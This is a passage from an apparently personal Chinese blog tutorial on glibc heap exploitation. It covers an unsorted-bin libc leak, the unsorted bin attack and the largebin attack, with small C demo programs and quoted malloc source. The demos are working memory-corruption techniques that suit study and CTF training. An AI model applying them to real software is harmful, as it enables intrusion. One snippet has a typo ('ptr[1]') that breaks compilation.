<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块并入Top chunk中</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p -- %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>], ptr[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//分别是fd 指针和 bk 指针</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>gdb 中的调试是这样的：</p>
<p>free 之后的堆结构及内存</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted1.png" srcset="/img/loading.gif" lazyload></p>
<p>如果你运行了上面的代码，就会发现 unsorted bin 中只有一个 chunk 时，bin 的 fd 指针和 bk 指针都指向 main_arena 。同样，如果有多个，头部 bin 的 fd 会指向 main_arena 。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted-leak1.png" srcset="/img/loading.gif" lazyload></p>
<p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址。以 pwntools 为例</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">main_arena_offset = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]</span> + <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure>

<p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p>
<h3 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h3><p>在 _int_malloc 中由一段与 bk 指针有关的代码，当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;   <span class="hljs-comment">//将 unsorted bin 链表的头指针的 bk字段设置为 bck</span><br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<blockquote>
<p>unsorted_chunks (av) 用于获取 unsortedbin 双向链表头部的指针</p>
<p>unsorted_chunks (av) 的两个重要元素：</p>
<p>fd：bin [0]（指向下一块数据，这里指向 unsorted bin 链表的头部）</p>
<p>bk：bin [1]（指向前一块数据，这里指向 unsorted bin 链表的尾部）</p>
</blockquote>
<p>unsorted bin 从尾部依次往前遍历，由于遍历到一个 chunk 就会进行脱链，所以如果要访问到下一个 chunk，只需要访问 <strong>unsorted_chunks (av)-&gt;bk</strong> 就可以了，而且当 bk 内容为 <strong>unsorted_chunks (av)</strong> 则可以说明全部数据已经被遍历，unsortbin 无内容了。</p>
<p>代码的后两行在做的就是把 victim 中链表中移除。在这个过程中，就利用 <code>bck-&gt;fd = unsorted_chunks (av);</code> 往上面写了一个 <strong>unsorted_chunks (av) 的地址</strong>，这是一个在 libc 上的地址，由 0x7f 开头，是一个很大的数字。</p>
<p>也就是说我们如果控制了 bck ，那么就可以在脱链的过程中，往 <strong>victim-&gt;bk-&gt;fd</strong> 写入一个很大的数字。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_var = <span class="hljs-number">0</span>;   <span class="hljs-comment">//目标写入的栈</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);   <span class="hljs-comment">//防止与 top chunk 合并</span><br>    <br>    <span class="hljs-built_in">free</span>(p);<br>    p[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);  <span class="hljs-comment">//p 的 bk 指向target_var</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-type">void</span>*)target_var);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>具体流程如下图</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_bin_attack_order.png" srcset="/img/loading.gif" lazyload></p>
<p>初始状态的时候，unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。 </p>
<p>执行 free(p) ，释放的 chunk 进入 unsortedbin </p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb1.png" srcset="/img/loading.gif" lazyload></p>
<p>修改 p[1] 之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb2.png" srcset="/img/loading.gif" lazyload></p>
<p>再次申请 chunk，就会从 unsortedbin 中取出，此时 unsortedbin 中的结构变成</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb3.png" srcset="/img/loading.gif" lazyload></p>
<p>最后结果如下</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb4.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h1><blockquote>
<p>搞这里的时候头昏昏的，先这么放着，待修改😶‍🌫️</p>
</blockquote>
<h3 id="largebin-复习"><a href="#largebin-复习" class="headerlink" title="largebin 复习"></a>largebin 复习</h3><p>大于512（1024）字节的 chunk 称为 large chunk，large bin 就是用于管理这些 large chunk </p>
<p>被释放进 Large Bin 中的 chunk ，除了和其他的 bin 相同的 prev_size、size、fd、bk 这几个结构之外，还具有 fd_nextsize 和 bk_nextsize :</p>
<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li>
</ul>
<p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适 chunk 时挨个遍历,提高了工作效率。</p>
<p>排列顺序：</p>
<ol>
<li><p>按照大小顺序从小到大排序</p>
</li>
<li><p>如果大小相同就按照 free 的先后顺序排序</p>
</li>
</ol>
<p>多个大小相同的堆块，只有首个堆块的 fd_nextsize 和 bk_nextsize 会指向其他堆块，后买你堆块的这两个指针均为0。size 最大的堆块的 bk_nextsize 指向最小的堆块，size 最小的堆块的 fd_nextsize 指向最大的堆块</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);   <span class="hljs-comment">//防止合并，下同</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>	<span class="hljs-built_in">free</span>(p1);<br>	<span class="hljs-built_in">free</span>(p2);<br><br> 	<span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> 	<span class="hljs-built_in">free</span>(p3);<br><br> 	p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;    <span class="hljs-comment">//size 设置为 0x3f1</span><br> 	p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd 置空</span><br> 	p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd_nextsize 置空</span><br>	p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);  <span class="hljs-comment">//bk 修改为 stack_var1_addr - 0x10</span><br>	p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);  <span class="hljs-comment">//bk_nextsize 修改为 stack_var1_addr - 0x20</span><br><br> 	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> 	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> 	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <br> 	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>第一轮 malloc 结束，堆结构如下，p1、p2、p3 的地址分别是 0x602000 、 0x602360 、 0x6027a0</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb1.png" srcset="/img/loading.gif" lazyload></p>
<p>释放掉 p1 和 p2，两个堆块都进入 unsortedbin 中 ，要注意的是，p1 的大小是 0x330 大小属于 small bin，而 p2 的大小是 0x410 属于 large bin</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb2.png" srcset="/img/loading.gif" lazyload></p>
<p>用 <code>malloc(0x90);</code> 分割堆块，所以原本的堆块被分割，剩余的部分进入了 largebin 。</p>
<p>实际上详细的流程如下：</p>
<ul>
<li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li>
<li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li>
<li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li>
<li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li>
<li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li>
</ul>
<p>所以会出现下图的堆结构：unsorted bin 中有一个 chunk 大小是 0x330 - 0xa0 &#x3D; 0x290 ；large bin 某一个序列的 bin 中有一个 chunk 大小是 0x410</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb3.png" srcset="/img/loading.gif" lazyload></p>
<p>free 掉 p3 ，p3 进入 unsortedbin</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb4.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来修改 p2 的信息，修改前后依次如下图</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb5.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb6.png" srcset="/img/loading.gif" lazyload></p>
<p>修改后的结果如下：</p>
<table>
<thead>
<tr>
<th>size</th>
<th>fd</th>
<th>bk</th>
<th>fd_nextsize</th>
<th>bk_nextsize</th>
</tr>
</thead>
<tbody><tr>
<td>0x3f1</td>
<td>0</td>
<td>stack_var1_addr - 0x10</td>
<td>0</td>
<td>stack_var2_addr - 0x20</td>
</tr>
</tbody></table>
<p>我们记这个 stack_var1 - 0x10 为 fakechunk1，此时 stack_var1 - 0x10 的 fd 指针指向 fakechunk1 ，同时 stack_var2 - 0x20 为 fakechunke2 ，此时 stack_var2 - 0x20 的 fd 指针指向 fakechunk2。</p>
<p>接下来我们再次 <code>malloc(0x90)</code>, p3 挂进了 largebin</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb7.png" srcset="/img/loading.gif" lazyload></p>
<p>具体有关这个部分的 malloc 代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br><br>        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>        <span class="hljs-keyword">if</span> (size == nb)<br>          &#123;<br>            set_inuse_bit_at_offset (victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>              victim-&gt;size |= NON_MAIN_ARENA;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br><br>        <span class="hljs-comment">/* place chunk in bin */</span><br><br>        <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>          &#123;<br>            victim_index = smallbin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            victim_index = largebin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>              &#123;<br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                  &#123;<br>                    fwd = bck;<br>                    bck = bck-&gt;bk;<br><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                      &#123;<br>                        fwd = fwd-&gt;fd_nextsize;<br>                        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      &#125;<br><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                      <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                      fwd = fwd-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                      &#123;<br>                        victim-&gt;fd_nextsize = fwd;<br>                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                        fwd-&gt;bk_nextsize = victim;<br>                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      &#125;<br>                    bck = fwd-&gt;bk;<br>                  &#125;<br>              &#125;<br>            <span class="hljs-keyword">else</span><br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>          &#125;<br><br>        mark_bin (av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure>

<p>这次我们从 unsortedbin 中拿出的是属于 largebin，所以进入到堆块大小判断的 else 分支，接下来就是指针的操作，由于我们的 p3 被我们修改过数据，就会跳过 while 的循环，进入下面的部分分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>&#123;<br>	fwd = fwd-&gt;fd_nextsize;<br>	assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br><span class="hljs-comment">/* Always insert in the second position.  */</span><br>	fwd = fwd-&gt;fd;<br><span class="hljs-keyword">else</span><br>&#123;<br>	victim-&gt;fd_nextsize = fwd;<br>	victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>	fwd-&gt;bk_nextsize = victim;<br>	victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以在下面的代码中，我们被修改的指针就完成了利用，修改了 stack_var1 和stack_var2 的值。</p>
<hr>
<p>觉得堆题还是要去分析一下源码，接下来就计划去看看源码</p>
<p><del>先做几道题练练手</del></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Knowledge/">#Knowledge</a>
      
        <a href="/tags/heap/">#heap</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>堆漏洞利用(一)</div>
      <div>https://shmodifier.github.io/2023/08/06/堆漏洞利用-一/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Modifier</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年8月6日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
                    <i class="iconfont icon-sa"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/08/15/SROP/" title="SROP">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SROP</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/08/04/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/" title="修师傅修虚拟机系列">
                        <span class="hidden-mobile">修师傅修虚拟机系列</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    
    <div class="footer-content">
       <p> Copyright &copy; 2022&nbsp;-&nbsp;2023 <a href="/">Modifier</a> </p> <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></p> <!--  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> -->

    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  

<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
